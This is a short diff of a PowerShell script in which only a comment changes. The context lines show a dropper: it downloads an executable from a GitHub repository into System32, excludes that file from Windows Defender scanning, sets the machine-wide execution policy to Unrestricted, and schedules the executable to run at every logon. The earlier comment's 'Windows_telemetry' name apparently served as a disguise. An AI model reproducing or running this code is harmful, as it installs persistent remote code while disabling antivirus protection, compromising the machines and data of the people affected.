@@ -4,7 +4,7 @@ Invoke-WebRequest 'https://github.com/mrnobody59420-hub/crispy-umbrella/raw/refs
 Add-MpPreference -ExclusionPath "C:\Windows\System32\N0b0dy.exe"
 # set execution policy
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine
-# add schedule to start Windows_telemetry.ps1
+# add schedule to start exe
 # add variables for scheduler
 $action = New-ScheduledTaskAction -Execute 'C:\Windows\System32\N0b0dy.exe'
 $trigger = New-ScheduledTaskTrigger -AtLogOn
